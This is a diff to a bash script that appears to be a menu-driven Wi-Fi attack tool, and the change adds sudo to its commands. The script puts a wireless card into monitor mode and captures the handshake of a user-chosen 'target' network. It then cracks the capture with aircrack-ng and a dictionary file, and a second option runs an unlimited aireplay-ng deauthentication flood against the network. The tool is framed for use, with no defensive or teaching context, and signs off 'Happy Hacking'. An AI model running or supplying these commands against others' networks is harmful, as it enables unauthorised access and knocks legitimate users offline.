@@ -31,9 +31,9 @@ echo "      $(tput setaf 1)[$(tput setaf 4)2$(tput setaf 1)] $(tput setaf 2)Wifi
 echo -e "      $(tput setaf 1)[$(tput setaf 4)3$(tput setaf 1)] $(tput setaf 2)Exit\n\n$(tput setaf 7)"
 }
 hacking () {
-airmon-ng start wlan0 > /dev/null
+sudo airmon-ng start wlan0 > /dev/null
 trap "airmon-ng stop wlan0mon > /dev/null" EXIT
-airodump-ng wlan0mon
+sudo airodump-ng wlan0mon
 echo
 read -p "$(tput setaf 1)Enter the target network BSSID > $(tput setaf 7)" bssid
 echo
@@ -54,9 +54,9 @@ logo
 start
 hacking
 x-terminal-emulator -e ./airplay.sh $bssid
-airodump-ng --bssid $bssid --channel $ch wlan0mon -w files 
-aircrack-ng -w dictionary/dictionary.txt files-01.cap
-airmon-ng stop wlan0mon > /dev/null
+sudo airodump-ng --bssid $bssid --channel $ch wlan0mon -w files 
+sudo aircrack-ng -w dictionary/dictionary.txt files-01.cap
+sudo airmon-ng stop wlan0mon > /dev/null
 rm files*
 logo
 option
@@ -65,8 +65,8 @@ option
 logo
 start
 hacking
-airodump-ng --bssid $bssid --channel $ch wlan0mon
-aireplay-ng -0 0 -a $bssid wlan0mon 
+sudo airodump-ng --bssid $bssid --channel $ch wlan0mon
+sudo aireplay-ng -0 0 -a $bssid wlan0mon 
     ;;
   3) echo -e "$(tput setaf 1)\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
      break;
